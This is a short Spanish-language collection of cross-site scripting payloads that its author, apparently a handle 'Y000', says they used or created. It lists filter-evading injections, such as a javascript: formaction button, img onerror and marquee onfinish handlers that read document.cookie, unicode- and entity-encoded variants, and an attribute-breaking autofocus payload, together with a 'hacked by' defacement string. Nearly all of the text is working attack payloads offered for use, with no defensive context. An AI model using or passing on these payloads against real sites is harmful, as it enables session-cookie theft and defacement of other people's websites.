Recopilación de todos los Payloads usados/creados por mi.


-1'<marquee>hacked by Y000</marquee>









Xss dentro de un botón en form:

`<form><button formaction=javascript&colon;alert('xss_by_Y000!')>_Y000!_`

`<marquee><form><button formacti\u006fn=javascript&colon;pr\u006fmpt('xss_by_Y000!')>_Y000!_</marquee>`



Img + Onerror

`<Img src="/" =_=" title=" onerror='prompt(document.cookie)'">`



```
<marquee direction="down" width="250" height="200" behavior="alternate" style="border:solid">
  <marquee behavior="alternate">
    Xss by Y000
  </marquee>
 <marquee behavior="alternate">
    Y000
  </marquee>
</marquee>
```


<marquee loop=1 width=0 onfinish=pr\u006fmpt(document.cookie)>Y000</marquee>



"onfocus="alert('Y000')"+autofocus="

</script><!--><svg onload=[document.domain].find%26%2340;alert%26rpar;>
